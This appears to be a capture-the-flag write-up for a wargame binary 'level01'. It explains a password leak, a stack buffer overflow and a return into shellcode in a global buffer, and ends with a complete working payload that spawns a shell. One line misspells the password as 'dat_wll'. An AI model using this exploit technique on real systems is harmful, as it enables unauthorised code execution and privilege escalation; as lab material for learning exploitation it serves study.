## Help level01

The level01 binary wait for an username and a password.
the password can be found with decompilation/GDB and we will get dat_wil.
But for the next step, we saw that fget get a max size of 100.
Knowing there isnt any system we will have to use a shellcode

Doing a segfault and print the register give us enough information to continue :
eip            0x36613561	0x36613561

a_user_name have a limit of 256, so we can to put our shellcode in, and access it on the next fget

with enough test we saw eip is overwrited on the 81 char so 80 padding on the first fgets
using objdump -t level01 we get the address of a_user_name : 0804a040, put in usefull format will be \x40\xa0\x04\08
Now, using the second fgets we do a call on the

first fget : dat_wil + padding + shellcode
second fget : padding + address

we will use \x90 as padding the nop instruction 256 - 8 - 33 = 215
so "dat_wll" + "\x90"*215+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
and "\x90"*80+"\x40\xa0\x04\x08"

we got ther final command :

```python
(python -c 'print("dat_wil" + "\x90"*215 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x90"*80+"\x40\xa0\x04\x08")'; cat -) | ./level01
```
